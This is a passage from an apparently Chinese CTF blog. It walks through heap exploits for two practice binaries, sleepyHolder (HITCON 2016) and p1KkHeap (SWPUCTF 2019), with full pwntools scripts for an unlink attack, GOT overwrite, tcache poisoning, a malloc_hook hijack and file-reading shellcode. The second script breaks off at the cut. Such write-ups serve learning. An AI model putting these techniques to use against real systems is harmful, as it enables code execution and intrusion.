-<h5 id="注意堆0时0x6020d0-堆1时0x6020c0，刚开始不太清楚为什么后面要补这么多1，后面看向add函数，堆0，1，2分别对应着0x6020e0-d8-dc的地址-有则表示1-堆1虽已dele，但是只是为了后面方便改指针，全都写成1"><a href="#注意堆0时0x6020d0-堆1时0x6020c0，刚开始不太清楚为什么后面要补这么多1，后面看向add函数，堆0，1，2分别对应着0x6020e0-d8-dc的地址-有则表示1-堆1虽已dele，但是只是为了后面方便改指针，全都写成1" class="headerlink" title="注意堆0时0x6020d0,堆1时0x6020c0，刚开始不太清楚为什么后面要补这么多1，后面看向add函数，堆0，1，2分别对应着0x6020e0,d8,dc的地址,有则表示1,堆1虽已dele，但是只是为了后面方便改指针，全都写成1"></a>注意堆0时0x6020d0,堆1时0x6020c0，刚开始不太清楚为什么后面要补这么多1，后面看向add函数，堆0，1，2分别对应着0x6020e0,d8,dc的地址,有则表示1,堆1虽已dele，但是只是为了后面方便改指针，全都写成1</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0</span>)+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])+p64(<span class="number">0</span>)+p64(<span class="number">0x6020c0</span>)+p32(<span class="number">1</span>)+p32(<span class="number">1</span>)+p32(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)  <span class="comment">#8</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i0.imgs.ovh/2023/10/31/Axq5v.png" alt="image-20231031175111527"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edit(2,p64(0x400760))  #put_plt</span><br><span class="line">edit(1,p64(0x602020))  #puts_got</span><br></pre></td></tr></table></figure>
-
-<h5 id="把free-got改写的内容改成puts-plt-可以执行puts函数，堆0的指针写上puts-got-然后dele堆1，就会打印出地址"><a href="#把free-got改写的内容改成puts-plt-可以执行puts函数，堆0的指针写上puts-got-然后dele堆1，就会打印出地址" class="headerlink" title="把free_got改写的内容改成puts_plt,可以执行puts函数，堆0的指针写上puts_got,然后dele堆1，就会打印出地址"></a>把free_got改写的内容改成puts_plt,可以执行puts函数，堆0的指针写上puts_got,然后dele堆1，就会打印出地址</h5><p><img src="https://i0.imgs.ovh/2023/10/31/AxaJ9.png" alt="image-20231031175406206"></p>
-<h5 id="然后算出偏移，算出system函数的地址，再edit堆0，0x6020c0"><a href="#然后算出偏移，算出system函数的地址，再edit堆0，0x6020c0" class="headerlink" title="然后算出偏移，算出system函数的地址，再edit堆0，0x6020c0"></a>然后算出偏移，算出system函数的地址，再edit堆0，0x6020c0</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])+p64(<span class="number">0</span>)+p32(<span class="number">1</span>)+p32(<span class="number">1</span>)+p32(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload) </span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i0.imgs.ovh/2023/10/31/AKQhe.png" alt="image-20231031180043302"></p>
-<h5 id="再edit堆2，写上system的地址，"><a href="#再edit堆2，写上system的地址，" class="headerlink" title="再edit堆2，写上system的地址，"></a>再edit堆2，写上system的地址，</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>,p64(system))</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="https://i0.imgs.ovh/2023/10/31/AKRU3.png" alt="image-20231031180248465"></p>
-<h5 id="主函数菜单那里还有个atoi函数，写上’sh’即可"><a href="#主函数菜单那里还有个atoi函数，写上’sh’即可" class="headerlink" title="主函数菜单那里还有个atoi函数，写上’sh’即可"></a>主函数菜单那里还有个atoi函数，写上’sh’即可</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&quot;node4.buuoj.cn&quot;,)</span></span><br><span class="line">p=process(<span class="string">&quot;./sleepyHolder_hitcon_2016&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./sleepyHolder_hitcon_2016&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">chose,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;3. Renew secret\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;What secret do you want to keep?&#x27;</span>,<span class="built_in">str</span>(chose))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Tell me your secret: &#x27;</span>,content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;3. Renew secret\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Which Secret do you want to wipe?&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">ch,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;3. Renew secret\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Which Secret do you want to renew?&#x27;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Tell me your secret: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;AAAA&#x27;</span>) </span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;BBBB&#x27;</span>) </span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">&#x27;cccc&#x27;</span>) </span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;aaaa&#x27;</span>) </span><br><span class="line"></span><br><span class="line">fd=<span class="number">0x6020d0</span>-<span class="number">0x18</span></span><br><span class="line">bk=<span class="number">0x6020d0</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(fd)+p64(bk)+p64(<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>) <span class="comment">#7 unlink</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])+p64(<span class="number">0</span>)+p64(<span class="number">0x6020c0</span>)+p32(<span class="number">1</span>)+p32(<span class="number">1</span>)+p32(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)  <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0x400760</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x602020</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#dele(2)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;2. Big secret&#x27;</span>)</span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">base=puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">system=base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])+p64(<span class="number">0</span>)+p32(<span class="number">1</span>)+p32(<span class="number">1</span>)+p32(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;3. Renew secret\n&#x27;</span>,<span class="string">&#x27;sh\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">buu</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2023/10/30/sleepyHolder-hitcon-2016/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-SWPUCTF-2019-p1KkHeap" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2023/10/29/SWPUCTF-2019-p1KkHeap/" target="_blank">SWPUCTF_2019_p1KkHeap</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2023/10/29/SWPUCTF-2019-p1KkHeap/" class="archive-article-date">
-        <time datetime="2023-10-29T09:53:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-10-29</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h5 id="所有操作总共限制在了0x12次"><a href="#所有操作总共限制在了0x12次" class="headerlink" title="所有操作总共限制在了0x12次"></a>所有操作总共限制在了0x12次</h5><p><img src="https://i0.imgs.ovh/2023/10/29/AV5dU.png" alt="image-20231029175834785"></p>
-<h5 id="保护全开，限制了堆的大小在0x100，不能绕过tachebin机制"><a href="#保护全开，限制了堆的大小在0x100，不能绕过tachebin机制" class="headerlink" title="保护全开，限制了堆的大小在0x100，不能绕过tachebin机制"></a>保护全开，限制了堆的大小在0x100，不能绕过tachebin机制</h5><p><img src="https://i0.imgs.ovh/2023/10/29/AVjMs.png" alt="image-20231029175545040"></p>
-<h5 id="dele时没有将bss段上的堆指针清零，存在double-free漏洞"><a href="#dele时没有将bss段上的堆指针清零，存在double-free漏洞" class="headerlink" title="dele时没有将bss段上的堆指针清零，存在double free漏洞"></a>dele时没有将bss段上的堆指针清零，存在double free漏洞</h5><p><img src="https://i0.imgs.ovh/2023/10/29/AV4uX.png" alt="image-20231029175653199"></p>
-<h5 id="最多只能申请8次堆"><a href="#最多只能申请8次堆" class="headerlink" title="最多只能申请8次堆"></a>最多只能申请8次堆</h5><p><img src="https://i0.imgs.ovh/2023/10/29/AVdF0.png" alt="image-20231029175951307"></p>
-<h5 id="本想泄露堆的地址然后改size泄露地址，但是最后的dele会报错，不知道什么原因，而且申请的次数根本不够用，所以这个方法不行。"><a href="#本想泄露堆的地址然后改size泄露地址，但是最后的dele会报错，不知道什么原因，而且申请的次数根本不够用，所以这个方法不行。" class="headerlink" title="本想泄露堆的地址然后改size泄露地址，但是最后的dele会报错，不知道什么原因，而且申请的次数根本不够用，所以这个方法不行。"></a>本想泄露堆的地址然后改size泄露地址，但是最后的dele会报错，不知道什么原因，而且申请的次数根本不够用，所以这个方法不行。</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x40</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x40</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment">#3</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">m0_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m0_addr))</span><br><span class="line"><span class="comment">#add(0x10,)</span></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">4</span>,p64(m0_addr+<span class="number">0x50</span>))</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x421</span>)</span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="https://i0.imgs.ovh/2023/10/29/AVy8l.png" alt="image-20231029190203419"></p>
-<h5 id="这里libc2-27有一种特性，tcache-perthread-struct结构体在堆上，释放后大小在0x20到0x410的堆的地址会放在开始的0x250的堆那里，这里释放了三个堆，从0x557386b4a010开始，他是小端序存储放到了后边，第一个字节是0x10大小的堆的数量，然后依次是0x20-最多放7个，放完就放fastbin和unsortedbin里。"><a href="#这里libc2-27有一种特性，tcache-perthread-struct结构体在堆上，释放后大小在0x20到0x410的堆的地址会放在开始的0x250的堆那里，这里释放了三个堆，从0x557386b4a010开始，他是小端序存储放到了后边，第一个字节是0x10大小的堆的数量，然后依次是0x20-最多放7个，放完就放fastbin和unsortedbin里。" class="headerlink" title="这里libc2.27有一种特性，tcache_perthread_struct结构体在堆上，释放后大小在0x20到0x410的堆的地址会放在开始的0x250的堆那里，这里释放了三个堆，从0x557386b4a010开始，他是小端序存储放到了后边，第一个字节是0x10大小的堆的数量，然后依次是0x20,最多放7个，放完就放fastbin和unsortedbin里。"></a>这里libc2.27有一种特性，tcache_perthread_struct结构体在堆上，释放后大小在0x20到0x410的堆的地址会放在开始的0x250的堆那里，这里释放了三个堆，从0x557386b4a010开始，他是小端序存储放到了后边，第一个字节是0x10大小的堆的数量，然后依次是0x20,最多放7个，放完就放fastbin和unsortedbin里。</h5><p><img src="https://i0.imgs.ovh/2023/10/29/ALhDX.png" alt="image-20231029203053580"></p>
-<h5 id="在主函数里有一个函数"><a href="#在主函数里有一个函数" class="headerlink" title="在主函数里有一个函数"></a>在主函数里有一个函数</h5><p><img src="https://i0.imgs.ovh/2023/10/29/ALSVt.png" alt="image-20231029205210736"></p>
-<h5 id="它映射了一个地址在0x6666000，那么这道题很明显用shellcode写，把shellcode写在这个地址然后执行"><a href="#它映射了一个地址在0x6666000，那么这道题很明显用shellcode写，把shellcode写在这个地址然后执行" class="headerlink" title="它映射了一个地址在0x6666000，那么这道题很明显用shellcode写，把shellcode写在这个地址然后执行"></a>它映射了一个地址在0x6666000，那么这道题很明显用shellcode写，把shellcode写在这个地址然后执行</h5><p><img src="https://i0.imgs.ovh/2023/10/29/ALukm.png" alt="image-20231029205237233"></p>
-<h5 id="首先先计算出tcache-perthread-struct结构体的地址，这里可以直接对一个堆释放两次"><a href="#首先先计算出tcache-perthread-struct结构体的地址，这里可以直接对一个堆释放两次" class="headerlink" title="首先先计算出tcache_perthread_struct结构体的地址，这里可以直接对一个堆释放两次"></a>首先先计算出tcache_perthread_struct结构体的地址，这里可以直接对一个堆释放两次</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">tache_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x360</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(tache_addr))</span><br></pre></td></tr></table></figure>
-
-<h5 id="再申请堆就能直接修改堆指针-改到tache-perthread-struct开始的地址"><a href="#再申请堆就能直接修改堆指针-改到tache-perthread-struct开始的地址" class="headerlink" title="再申请堆就能直接修改堆指针,改到tache_perthread_struct开始的地址"></a>再申请堆就能直接修改堆指针,改到tache_perthread_struct开始的地址</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)  <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(tache_addr))</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i0.imgs.ovh/2023/10/29/ALONR.png" alt="image-20231029210730885"></p>
-<h5 id="再申请两次，在tache-perthread能改到下面的地址-相对开始的偏移是0xc8-这里不太清楚为什么改到下面的bin指针，应该和堆管理器有关"><a href="#再申请两次，在tache-perthread能改到下面的地址-相对开始的偏移是0xc8-这里不太清楚为什么改到下面的bin指针，应该和堆管理器有关" class="headerlink" title="再申请两次，在tache_perthread能改到下面的地址,相对开始的偏移是0xc8,这里不太清楚为什么改到下面的bin指针，应该和堆管理器有关"></a>再申请两次，在tache_perthread能改到下面的地址,相对开始的偏移是0xc8,这里不太清楚为什么改到下面的bin指针，应该和堆管理器有关</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)  <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment">#4</span></span><br><span class="line">vmmap=<span class="number">0x66660000</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0xb8</span>*<span class="string">&#x27;\x00&#x27;</span>+p64(vmmap))</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i0.imgs.ovh/2023/10/29/AL1xd.png" alt="image-20231029213256159"></p>
-<h5 id="再申请堆，在0x66660000这个地址上写上shellcode，这里看到shellcode的大小是大于0x30的，至于为什么地址是0x66660300-其实后面改成shellcode以后的地址都可以，比如0x66660040以后"><a href="#再申请堆，在0x66660000这个地址上写上shellcode，这里看到shellcode的大小是大于0x30的，至于为什么地址是0x66660300-其实后面改成shellcode以后的地址都可以，比如0x66660040以后" class="headerlink" title="再申请堆，在0x66660000这个地址上写上shellcode，这里看到shellcode的大小是大于0x30的，至于为什么地址是0x66660300,其实后面改成shellcode以后的地址都可以，比如0x66660040以后"></a>再申请堆，在0x66660000这个地址上写上shellcode，这里看到shellcode的大小是大于0x30的，至于为什么地址是0x66660300,其实后面改成shellcode以后的地址都可以，比如0x66660040以后</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)  <span class="comment">#5</span></span><br><span class="line">shellcode=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">shellcode+=shellcraft.read(<span class="number">3</span>,<span class="number">0x66660300</span>,<span class="number">0x30</span>)</span><br><span class="line">shellcode+=shellcraft.write(<span class="number">1</span>,<span class="number">0x66660300</span>,<span class="number">0x30</span>)</span><br><span class="line">edit(<span class="number">5</span>,shellcode)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i0.imgs.ovh/2023/10/29/ALEZe.png" alt="image-20231029214310944"></p>
-<h5 id="当tache-perthread的size为0但所对应的首地址不为空时，再分配出去size会变成0xff大于7，再dele-0-会放在unsortedbin，因为大于0x80，此时可以泄露main-arena-96的地址，这个地址减0x70就是malloc-hook的地址"><a href="#当tache-perthread的size为0但所对应的首地址不为空时，再分配出去size会变成0xff大于7，再dele-0-会放在unsortedbin，因为大于0x80，此时可以泄露main-arena-96的地址，这个地址减0x70就是malloc-hook的地址" class="headerlink" title="当tache_perthread的size为0但所对应的首地址不为空时，再分配出去size会变成0xff大于7，再dele(0)会放在unsortedbin，因为大于0x80，此时可以泄露main_arena+96的地址，这个地址减0x70就是malloc_hook的地址"></a>当tache_perthread的size为0但所对应的首地址不为空时，再分配出去size会变成0xff大于7，再dele(0)会放在unsortedbin，因为大于0x80，此时可以泄露main_arena+96的地址，这个地址减0x70就是malloc_hook的地址</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">malloc_hook=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x70</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(malloc_hook))</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i0.imgs.ovh/2023/10/29/AXnaN.png" alt="image-20231029221645764"></p>
-<h5 id="再以相同的方式改掉tachebin的地址"><a href="#再以相同的方式改掉tachebin的地址" class="headerlink" title="再以相同的方式改掉tachebin的地址"></a>再以相同的方式改掉tachebin的地址</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">4</span>,<span class="number">0xb8</span>*<span class="string">&#x27;\x00&#x27;</span>+p64(malloc_hook))</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i0.imgs.ovh/2023/10/29/AXrKU.png" alt="image-20231029221302095"></p>
-<h5 id="再申请一次0x100大小的堆，edit内容为0x66660000的地址，再申请一次堆即可提权"><a href="#再申请一次0x100大小的堆，edit内容为0x66660000的地址，再申请一次堆即可提权" class="headerlink" title="再申请一次0x100大小的堆，edit内容为0x66660000的地址，再申请一次堆即可提权"></a>再申请一次0x100大小的堆，edit内容为0x66660000的地址，再申请一次堆即可提权</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&quot;node4.buuoj.cn&quot;,)</span></span><br><span class="line">p=process(<span class="string">&quot;./SWPUCTF_2019_p1KkHeap&quot;</span>)</span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your Choice: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your Choice: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;id: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your Choice: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;id: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your Choice: &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;id: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment">#1</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">tache_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x360</span></span><br><span class="line"><span 